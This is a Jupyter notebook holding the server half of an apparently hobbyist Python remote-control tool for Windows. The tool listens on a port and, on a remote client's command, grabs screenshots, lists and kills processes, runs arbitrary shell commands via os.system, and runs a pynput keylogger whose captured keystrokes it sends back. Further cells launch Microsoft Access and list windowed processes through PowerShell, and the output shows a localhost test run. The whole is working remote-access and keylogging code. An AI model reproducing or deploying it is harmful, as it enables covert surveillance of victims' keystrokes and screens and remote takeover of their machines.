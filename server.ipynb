{
 "metadata": {
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.4"
  },
  "orig_nbformat": 2,
  "kernelspec": {
   "name": "python394jvsc74a57bd01007ded7e1eaff6b45cf04652a42e4c7215e16ff81050cd9ffb14c011d6a5a93",
   "display_name": "Python 3.9.4 64-bit"
  },
  "metadata": {
   "interpreter": {
    "hash": "1007ded7e1eaff6b45cf04652a42e4c7215e16ff81050cd9ffb14c011d6a5a93"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2,
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "output_type": "stream",
     "name": "stdout",
     "text": [
      "Starting Server!\n",
      "Connected by:  ('127.0.0.1', 51974)\n",
      "Receive: screenshot\n",
      "SEND SCREENSHOT\n",
      "\tSent dump data. Size: 6220874\n"
     ]
    },
    {
     "output_type": "error",
     "ename": "ConnectionClosed",
     "evalue": "connection closed after reading 0 bytes without finding symbol: b'!F!'",
     "traceback": [
      "\u001b[1;31m---------------------------------------------------------------------------\u001b[0m",
      "\u001b[1;31mConnectionClosed\u001b[0m                          Traceback (most recent call last)",
      "\u001b[1;32m<ipython-input-11-c5b0d1633af8>\u001b[0m in \u001b[0;36m<module>\u001b[1;34m\u001b[0m\n\u001b[0;32m    109\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    110\u001b[0m     \u001b[1;32mwhile\u001b[0m \u001b[1;32mTrue\u001b[0m\u001b[1;33m:\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[1;32m--> 111\u001b[1;33m         \u001b[0mflag\u001b[0m \u001b[1;33m=\u001b[0m \u001b[0mbuff\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mrecv_until\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34mb'!F!'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mdecode\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    112\u001b[0m         \u001b[0mprint\u001b[0m\u001b[1;33m(\u001b[0m\u001b[1;34mf'Receive: {flag}'\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    113\u001b[0m \u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;32m~\\AppData\\Local\\Packages\\PythonSoftwareFoundation.Python.3.9_qbz5n2kfra8p0\\LocalCache\\local-packages\\Python39\\site-packages\\boltons\\socketutils.py\u001b[0m in \u001b[0;36mrecv_until\u001b[1;34m(self, delimiter, timeout, maxsize, with_delimiter)\u001b[0m\n\u001b[0;32m    321\u001b[0m                         msg = ('connection closed after reading %s bytes'\n\u001b[0;32m    322\u001b[0m                                ' without finding symbol: %r' % args)\n\u001b[1;32m--> 323\u001b[1;33m                         \u001b[1;32mraise\u001b[0m \u001b[0mConnectionClosed\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mmsg\u001b[0m\u001b[1;33m)\u001b[0m  \u001b[1;31m# check the recv buffer\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0m\u001b[0;32m    324\u001b[0m                     \u001b[0mrecvd\u001b[0m\u001b[1;33m.\u001b[0m\u001b[0mextend\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mnxt\u001b[0m\u001b[1;33m)\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n\u001b[0;32m    325\u001b[0m                     \u001b[0mfind_offset_start\u001b[0m \u001b[1;33m=\u001b[0m \u001b[1;33m-\u001b[0m\u001b[0mlen\u001b[0m\u001b[1;33m(\u001b[0m\u001b[0mnxt\u001b[0m\u001b[1;33m)\u001b[0m \u001b[1;33m-\u001b[0m \u001b[0mlen_delimiter\u001b[0m \u001b[1;33m+\u001b[0m \u001b[1;36m1\u001b[0m\u001b[1;33m\u001b[0m\u001b[1;33m\u001b[0m\u001b[0m\n",
      "\u001b[1;31mConnectionClosed\u001b[0m: connection closed after reading 0 bytes without finding symbol: b'!F!'"
     ]
    }
   ],
   "source": [
    "import socket\n",
    "import pickle\n",
    "from boltons import socketutils\n",
    "from pynput import keyboard\n",
    "from PIL import ImageGrab\n",
    "import os\n",
    "import wmi\n",
    "\n",
    "SERVER = \"\"\n",
    "PORT = 1234\n",
    "DELIM = b'\\x00'\n",
    "\n",
    "# dump func\n",
    "def sendDump(buff, var):\n",
    "    dump = pickle.dumps(var)\n",
    "    dump_size = len(dump)\n",
    "\n",
    "    buff.send(str(dump_size).encode() + DELIM)\n",
    "    buff.send(dump)\n",
    "    print(f'\\tSent dump data. Size: {dump_size}')\n",
    "\n",
    "# keylogger func\n",
    "def keylogger_Server(buff):\n",
    "    def on_press(key):\n",
    "        nonlocal string\n",
    "        try:\n",
    "            string += key.char\n",
    "        except AttributeError:\n",
    "            _key = str(key).split('.')[1].upper()\n",
    "\n",
    "            if _key == 'ENTER':\n",
    "                string += f'[{_key}]\\n'\n",
    "            elif _key == 'SPACE':\n",
    "                string += ' '\n",
    "            elif _key == 'BACKSPACE':\n",
    "                string = string[:-1]\n",
    "            else:\n",
    "                string += f'[{_key}]'\n",
    "\n",
    "    print('KEYLOGGER FUNCTION')\n",
    "    string = ''\n",
    "    isHook = False\n",
    "\n",
    "    while True:\n",
    "        flag = buff.recv_until(DELIM).decode()\n",
    "        print(f'\\tReceive: {flag}')\n",
    "        \n",
    "        if flag == 'hook' and not isHook:\n",
    "            listener = keyboard.Listener(on_press = on_press)\n",
    "            listener.start()\n",
    "            isHook = True\n",
    "        elif flag == 'unhook' and isHook:\n",
    "            listener.stop()\n",
    "            isHook = False\n",
    "        elif flag == 'clear':\n",
    "            string = ''\n",
    "        elif flag == 'send':\n",
    "            buff.send(string.encode() + DELIM)\n",
    "        elif flag == 'exit':\n",
    "            if isHook:\n",
    "                listener.stop()\n",
    "            break\n",
    "        \n",
    "# kill process func\n",
    "def getKillProcess(buff):\n",
    "    pid = int(buff.recv_until(DELIM).decode())\n",
    "    print(f'KILL PROCESS {pid}')\n",
    "\n",
    "    try:\n",
    "        os.kill(pid, 9)\n",
    "    except:\n",
    "        print('\\t Err: No process with uid exist')\n",
    "\n",
    "# process list func\n",
    "def sendProcessList(buff):\n",
    "    print('SEND PROCESS LIST')\n",
    "    f = wmi.WMI()\n",
    "\n",
    "    process_data = []\n",
    "    for process in f.Win32_Process([\"ProcessId\", \"Name\", \"ThreadCount\"]):\n",
    "        process_data.append([process.ProcessId, process.Name, process.ThreadCount])\n",
    "\n",
    "    sendDump(buff, process_data)\n",
    "\n",
    "#  screenshot func\n",
    "def sendScreenShot(buff):\n",
    "    print('SEND SCREENSHOT')\n",
    "    image = ImageGrab.grab()\n",
    "    \n",
    "    sendDump(buff, image)\n",
    "\n",
    "#close connection\n",
    "def closeConnection(buff):\n",
    "    print('CLOSE CONNECTION')\n",
    "    buff.close()\n",
    "\n",
    "# create socket\n",
    "with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n",
    "    s.bind((SERVER, PORT))\n",
    "\n",
    "    # start socket and wait to connect\n",
    "    print(\"Starting Server!\")\n",
    "    s.listen()\n",
    "    conn, addr = s.accept()\n",
    "    print(\"Connected by: \", addr)\n",
    "\n",
    "\n",
    "    buff = socketutils.BufferedSocket(conn, None)\n",
    "\n",
    "    while True:\n",
    "        flag = buff.recv_until(b'!F!').decode()\n",
    "        print(f'Receive: {flag}')\n",
    "        \n",
    "        if flag == 'screenshot':\n",
    "            sendScreenShot(buff)\n",
    "        elif flag == 'processlist':\n",
    "            sendProcessList(buff)\n",
    "        elif flag == 'killprocess':\n",
    "            getKillProcess(buff)\n",
    "        elif flag == 'command':\n",
    "            getCommand(buff)\n",
    "        elif flag == 'keylogger':\n",
    "            keylogger_Server(buff)\n",
    "        else:\n",
    "            closeConnection(buff)\n",
    "            break\n",
    "\n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "# vấn đề với hàm cmd\n",
    "def getCommand(buff):\n",
    "    command = (buff.recv_until(DELIM).decode())\n",
    "    print(f'COMMAND {command}')\n",
    "\n",
    "    returnVal = os.system(command)\n",
    "    sendDump(buff, returnVal)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess\n",
    "import win32api\n",
    "import win32process\n",
    "\n",
    "\n",
    "#subprocess.Popen('notepad')\n",
    "#win32api.ShellExecute(None, None, \"notepad.exe\", None, None, 5)\n",
    "win32process.CreateProcess(None, \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\Office16\\\\MSACCESS.EXE\", None, None, 8, win32process.NORMAL_PRIORITY_CLASS, None, None, win32process.STARTUPINFO())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import subprocess\n",
    "cmd = 'powershell \"gps | where {$_.MainWindowTitle } | select Description'\n",
    "proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n",
    "for line in proc.stdout:\n",
    "    if line.rstrip():\n",
    "        # only print lines that are not empty\n",
    "        # decode() is necessary to get rid of the binary string (b')\n",
    "        # rstrip() to remove `\\r\\n`\n",
    "        print(line.decode().rstrip())"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ]
}